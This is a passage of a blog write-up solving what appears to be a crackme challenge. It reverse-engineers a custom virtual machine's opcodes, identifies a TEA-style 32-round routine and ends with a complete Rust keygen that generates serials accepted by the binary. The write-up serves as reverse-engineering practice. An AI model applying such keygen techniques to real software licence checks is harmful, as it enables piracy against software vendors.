src=\"/images/posts/tea-and-psychological-damage/vm2-5.png\" alt=\"Load Upper Immediate\">\u003C/p>\n\u003Cp>Another similar instruction was identified as Load Upper Immediate, which loads an immediate value into the upper portion of a register.\u003C/p>\n\u003Ch3 id=\"addition-vm_add\">Addition (vm_add)\u003C/h3>\n\u003Cp>\u003Cimg src=\"/images/posts/tea-and-psychological-damage/vm2-6.png\" alt=\"Addition Operation\">\u003C/p>\n\u003Cp>The next instruction handled addition between values.\u003C/p>\n\u003Ch3 id=\"conditional-jump\">Conditional Jump\u003C/h3>\n\u003Cp>The next instruction was particularly complex. It combines two bytes into a 16-bit value and then performs conditional logic based on comparisons. It checks whether a condition is met and updates the VM instruction pointer accordingly. Based on its behavior, this instruction appears to act like a conditional jump.\u003C/p>\n\u003Ch3 id=\"compare-instruction\">Compare Instruction\u003C/h3>\n\u003Cp>\u003Cimg src=\"/images/posts/tea-and-psychological-damage/vm2-7.png\" alt=\"Compare Instruction\">\u003C/p>\n\u003Cp>After that, another instruction was identified which performs comparisons between values.\u003C/p>\n\u003Ch3 id=\"stack-operations\">Stack Operations\u003C/h3>\n\u003Cp>\u003Cimg src=\"/images/posts/tea-and-psychological-damage/vm2-8.png\" alt=\"Push Operation\">\u003C/p>\n\u003Cp>Two instructions handle stack management:\u003C/p>\n\u003Cul>\n\u003Cli>\u003Cstrong>Push\u003C/strong>: Pushes values onto the VM stack\u003C/li>\n\u003C/ul>\n\u003Cp>\u003Cimg src=\"/images/posts/tea-and-psychological-damage/vm2-9.png\" alt=\"Pop Operation\">\u003C/p>\n\u003Cul>\n\u003Cli>\u003Cstrong>Pop\u003C/strong>: Pops values from the VM stack\u003C/li>\n\u003C/ul>\n\u003Ch3 id=\"subtraction-vm_sub\">Subtraction (vm_sub)\u003C/h3>\n\u003Cp>\u003Cimg src=\"/images/posts/tea-and-psychological-damage/vm2-10.png\" alt=\"Subtraction Operation\">\u003C/p>\n\u003Cp>Another instruction performs subtraction between values.\u003C/p>\n\u003Ch3 id=\"bit-shifting\">Bit Shifting\u003C/h3>\n\u003Cp>\u003Cimg src=\"/images/posts/tea-and-psychological-damage/vm2-11.png\" alt=\"Bit Shifting\">\u003C/p>\n\u003Cp>This instruction was more math-heavy and performs bit shifting operations before producing a result.\u003C/p>\n\u003Ch3 id=\"xor-operation\">XOR Operation\u003C/h3>\n\u003Cp>\u003Cimg src=\"/images/posts/tea-and-psychological-damage/vm2-12.png\" alt=\"XOR Operation\">\u003C/p>\n\u003Cp>The next instruction performs an XOR operation.\u003C/p>\n\u003Ch3 id=\"nop\">NOP\u003C/h3>\n\u003Cp>\u003Cimg src=\"/images/posts/tea-and-psychological-damage/vm2-13.png\" alt=\"NOP Instruction\">\u003C/p>\n\u003Cp>Finally, this instruction does nothing and serves as a NOP.\u003C/p>\n\u003Ch2 id=\"the-opcode-table\">The Opcode Table\u003C/h2>\n\u003Cp>After finally renaming all the VM instructions in radare2, I ended up with a clear structure of how the virtual machine works internally.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/tea-and-psychological-damage/vm2-14.png\" alt=\"VM Structure\">\u003C/p>\n\u003Cp>I also identified the main VM dispatcher, which is responsible for fetching each instruction, decoding the opcode, and jumping to the correct handler.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/tea-and-psychological-damage/vm2-15.png\" alt=\"VM Dispatcher\">\u003C/p>\n\u003Cp>Since the opcode handlers were already renamed and understood, I mapped out the full opcode table.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/tea-and-psychological-damage/vm2-16.png\" alt=\"Opcode Table\">\u003C/p>\n\u003Cp>With this information, the extracted VM bytecode could now be mapped properly, because we know what each register represents and what each instruction does.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/tea-and-psychological-damage/vm2-17.png\" alt=\"Bytecode Dump\">\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/tea-and-psychological-damage/vm2-20.png\" alt=\"Keygen\">\u003C/p>\n\u003Ch2 id=\"discovering-tea-encryption\">Discovering TEA Encryption\u003C/h2>\n\u003Cp>At this point, the next goal was figuring out how to convert this raw bytecode dump into readable pseudocode.\u003C/p>\n\u003Cp>When the VM starts running, it first loads two constant values. One of them is \u003Ccode>0x9e3779b9\u003C/code>, which is a well-known constant used in the TEA (Tiny Encryption Algorithm) encryption algorithm. This immediately hints that some kind of encryption or mixing logic is involved.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/tea-and-psychological-damage/vm2-18.png\" alt=\"TEA Constant\">\u003C/p>\n\u003Ch2 id=\"the-algorithm\">The Algorithm\u003C/h2>\n\u003Cp>Instead of explaining everything line by line, the image below gives a clean high-level view of what the VM is actually doing.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/tea-and-psychological-damage/vm2-19.png\" alt=\"Algorithm Overview\">\u003C/p>\n\u003Cp>In short, the program takes your input key and scrambles it using a small encryption-like routine that runs for 32 rounds. After all rounds are done, the final result is compared against two hardcoded secret values. If the values match, the key is accepted.\u003C/p>\n\u003Ch2 id=\"keygen-solution\">Keygen Solution\u003C/h2>\n\u003Cp>To solve this, I wrote a keygen in Rust that reverses the TEA encryption process:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"rust\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">use\u003C/span>\u003Cspan style=\"color:#B392F0\"> rand\u003C/span>\u003Cspan style=\"color:#F97583\">::\u003C/span>\u003Cspan style=\"color:#B392F0\">Rng\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">fn\u003C/span>\u003Cspan style=\"color:#B392F0\"> combine\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(seed\u003C/span>\u003Cspan style=\"color:#F97583\">:\u003C/span>\u003Cspan style=\"color:#B392F0\"> u32\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, a\u003C/span>\u003Cspan style=\"color:#F97583\">:\u003C/span>\u003Cspan style=\"color:#B392F0\"> u32\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, b\u003C/span>\u003Cspan style=\"color:#F97583\">:\u003C/span>\u003Cspan style=\"color:#B392F0\"> u32\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, c\u003C/span>\u003Cspan style=\"color:#F97583\">:\u003C/span>\u003Cspan style=\"color:#B392F0\"> u32\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) \u003C/span>\u003Cspan style=\"color:#F97583\">->\u003C/span>\u003Cspan style=\"color:#B392F0\"> u32\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    let\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> r9  \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> a\u003C/span>\u003Cspan style=\"color:#F97583\">.\u003C/span>\u003Cspan style=\"color:#B392F0\">wrapping_shr\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#79B8FF\">5\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#F97583\">.\u003C/span>\u003Cspan style=\"color:#B392F0\">wrapping_add\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(b);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    let\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> r10 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> a\u003C/span>\u003Cspan style=\"color:#F97583\">.\u003C/span>\u003Cspan style=\"color:#B392F0\">wrapping_add\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(seed);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    let\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> r11 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> a\u003C/span>\u003Cspan style=\"color:#F97583\">.\u003C/span>\u003Cspan style=\"color:#B392F0\">wrapping_shl\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#79B8FF\">4\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#F97583\">.\u003C/span>\u003Cspan style=\"color:#B392F0\">wrapping_add\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(c);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    r11 \u003C/span>\u003Cspan style=\"color:#F97583\">^\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> r10 \u003C/span>\u003Cspan style=\"color:#F97583\">^\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> r9\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">fn\u003C/span>\u003Cspan style=\"color:#B392F0\"> validate\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">mut\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> serial\u003C/span>\u003Cspan style=\"color:#F97583\">:\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"color:#B392F0\">u32\u003C/span>\u003Cspan style=\"color:#E1E4E8\">; \u003C/span>\u003Cspan style=\"color:#79B8FF\">6\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]) \u003C/span>\u003Cspan style=\"color:#F97583\">->\u003C/span>\u003Cspan style=\"color:#B392F0\"> bool\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    let\u003C/span>\u003Cspan style=\"color:#F97583\"> mut\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> r6 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0xc6ef_3720\u003C/span>\u003Cspan style=\"color:#B392F0\">u32\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    let\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> r7 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0x9e37_79b9\u003C/span>\u003Cspan style=\"color:#B392F0\">u32\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    for\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> _ \u003C/span>\u003Cspan style=\"color:#F97583\">in\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#F97583\">..\u003C/span>\u003Cspan style=\"color:#79B8FF\">32\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">        let\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> r12 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> combine\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(r6, serial[\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">], serial[\u003C/span>\u003Cspan style=\"color:#79B8FF\">5\u003C/span>\u003Cspan style=\"color:#E1E4E8\">], serial[\u003C/span>\u003Cspan style=\"color:#79B8FF\">4\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        serial[\u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">] \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> serial[\u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003Cspan style=\"color:#F97583\">.\u003C/span>\u003Cspan style=\"color:#B392F0\">wrapping_sub\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(r12);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">        let\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> r12 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> combine\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(r6, serial[\u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">], serial[\u003C/span>\u003Cspan style=\"color:#79B8FF\">3\u003C/span>\u003Cspan style=\"color:#E1E4E8\">], serial[\u003C/span>\u003Cspan style=\"color:#79B8FF\">2\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        serial[\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">] \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> serial[\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003Cspan style=\"color:#F97583\">.\u003C/span>\u003Cspan style=\"color:#B392F0\">wrapping_sub\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(r12);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        r6 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> r6\u003C/span>\u003Cspan style=\"color:#F97583\">.\u003C/span>\u003Cspan style=\"color:#B392F0\">wrapping_sub\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(r7);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    serial[\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">] \u003C/span>\u003Cspan style=\"color:#F97583\">==\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0xba01_aafe\u003C/span>\u003Cspan style=\"color:#F97583\"> &#x26;&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> serial[\u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">] \u003C/span>\u003Cspan style=\"color:#F97583\">==\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0xbbff_31a3\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">fn\u003C/span>\u003Cspan style=\"color:#B392F0\"> keygen\u003C/span>\u003Cspan style=\"color:#E1E4E8\">() \u003C/span>\u003Cspan style=\"color:#F97583\">->\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"color:#B392F0\">u32\u003C/span>\u003Cspan style=\"color:#E1E4E8\">; \u003C/span>\u003Cspan style=\"color:#79B8FF\">6\u003C/span>\u003Cspan style=\"color:#E1E4E8\">] {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    let\u003C/span>\u003Cspan style=\"color:#F97583\"> mut\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> serial \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#B392F0\">u32\u003C/span>\u003Cspan style=\"color:#E1E4E8\">; \u003C/span>\u003Cspan style=\"color:#79B8FF\">6\u003C/span>\u003Cspan style=\"color:#E1E4E8\">];\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    serial[\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">] \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0xba01_aafe\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    serial[\u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">] \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0xbbff_31a3\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    let\u003C/span>\u003Cspan style=\"color:#F97583\"> mut\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> rng \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> rand\u003C/span>\u003Cspan style=\"color:#F97583\">::\u003C/span>\u003Cspan style=\"color:#B392F0\">thread_rng\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    serial[\u003C/span>\u003Cspan style=\"color:#79B8FF\">2\u003C/span>\u003Cspan style=\"color:#E1E4E8\">] \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> rng\u003C/span>\u003Cspan style=\"color:#F97583\">.\u003C/span>\u003Cspan style=\"color:#B392F0\">gen\u003C/span>\u003Cspan style=\"color:#F97583\">::\u003C/span>\u003Cspan style=\"color:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"color:#B392F0\">u32\u003C/span>\u003Cspan style=\"color:#E1E4E8\">>();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    serial[\u003C/span>\u003Cspan style=\"color:#79B8FF\">3\u003C/span>\u003Cspan style=\"color:#E1E4E8\">] \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> rng\u003C/span>\u003Cspan style=\"color:#F97583\">.\u003C/span>\u003Cspan style=\"color:#B392F0\">gen\u003C/span>\u003Cspan style=\"color:#F97583\">::\u003C/span>\u003Cspan style=\"color:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"color:#B392F0\">u32\u003C/span>\u003Cspan style=\"color:#E1E4E8\">>();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    serial[\u003C/span>\u003Cspan style=\"color:#79B8FF\">4\u003C/span>\u003Cspan style=\"color:#E1E4E8\">] \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> rng\u003C/span>\u003Cspan style=\"color:#F97583\">.\u003C/span>\u003Cspan style=\"color:#B392F0\">gen\u003C/span>\u003Cspan style=\"color:#F97583\">::\u003C/span>\u003Cspan style=\"color:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"color:#B392F0\">u32\u003C/span>\u003Cspan style=\"color:#E1E4E8\">>();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    serial[\u003C/span>\u003Cspan style=\"color:#79B8FF\">5\u003C/span>\u003Cspan style=\"color:#E1E4E8\">] \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> rng\u003C/span>\u003Cspan style=\"color:#F97583\">.\u003C/span>\u003Cspan style=\"color:#B392F0\">gen\u003C/span>\u003Cspan style=\"color:#F97583\">::\u003C/span>\u003Cspan style=\"color:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"color:#B392F0\">u32\u003C/span>\u003Cspan style=\"color:#E1E4E8\">>();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    let\u003C/span>\u003Cspan style=\"color:#F97583\"> mut\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> r6 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0x9e37_79b9\u003C/span>\u003Cspan style=\"color:#B392F0\">u32\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    for\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> _ \u003C/span>\u003Cspan style=\"color:#F97583\">in\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#F97583\">..\u003C/span>\u003Cspan style=\"color:#79B8FF\">32\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">        let\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> r12 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> combine\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(r6, serial[\u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">], serial[\u003C/span>\u003Cspan style=\"color:#79B8FF\">3\u003C/span>\u003Cspan style=\"color:#E1E4E8\">], serial[\u003C/span>\u003Cspan style=\"color:#79B8FF\">2\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        serial[\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">] \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> serial[\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003Cspan style=\"color:#F97583\">.\u003C/span>\u003Cspan style=\"color:#B392F0\">wrapping_add\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(r12);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">        let\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> r12 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> combine\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(r6, serial[\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">], serial[\u003C/span>\u003Cspan style=\"color:#79B8FF\">5\u003C/span>\u003Cspan style=\"color:#E1E4E8\">], serial[\u003C/span>\u003Cspan style=\"color:#79B8FF\">4\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        serial[\u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">] \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> serial[\u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003Cspan style=\"color:#F97583\">.\u003C/span>\u003Cspan style=\"color:#B392F0\">wrapping_add\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(r12);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        r6 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> r6\u003C/span>\u003Cspan style=\"color:#F97583\">.\u003C/span>\u003Cspan style=\"color:#B392F0\">wrapping_add\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#79B8FF\">0x9e37_79b9\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    serial\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">fn\u003C/span>\u003Cspan style=\"color:#B392F0\"> main\u003C/span>\u003Cspan style=\"color:#E1E4E8\">() {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    for\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> _ \u003C/span>\u003Cspan style=\"color:#F97583\">in\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#F97583\">..\u003C/span>\u003Cspan style=\"color:#79B8FF\">100\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">        let\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> s \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> keygen\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">        assert!\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#B392F0\">validate\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(s));\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">        println!\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">            \"{:08x},{:08x},{:08x},{:08x},{:08x},{:08x}\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">            s[\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">], s[\u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">], s[\u003C/span>\u003Cspan style=\"color:#79B8FF\">2\u003C/span>\u003Cspan style=\"color:#E1E4E8\">], s[\u003C/span>\u003Cspan style=\"color:#79B8FF\">3\u003C/span>\u003Cspan style=\"color:#E1E4E8\">], s[\u003C/span>\u003Cspan style=\"color:#79B8FF\">4\u003C/span>\u003Cspan style=\"color:#E1E4E8\">], s[\u003C/span>\u003Cspan style=\"color:#79B8FF\">5\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        );\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>The keygen generates valid serials by:\u003C/p>\n\u003Col>\n\u003Cli>\n\u003Cp>Starting with the target values (\u003Ccode>0xba01aafe\u003C/code> and \u003Ccode>0xbbff31a3\u003C/code>)\u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>Generating random values for the other four registers\u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>Running the TEA algorithm forward for 32 rounds\r\n\u003Cimg src=\"/images/posts/tea-and-psychological-damage/vm2-21.png\" alt=\"Output\">\u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>The resulting values become valid input keys\u003C/p>\n\u003C/li>\n\u003C/ol>\n\u003Cp>This challenge was a great exercise in reverse engineering a custom virtual machine and understanding classic encryption 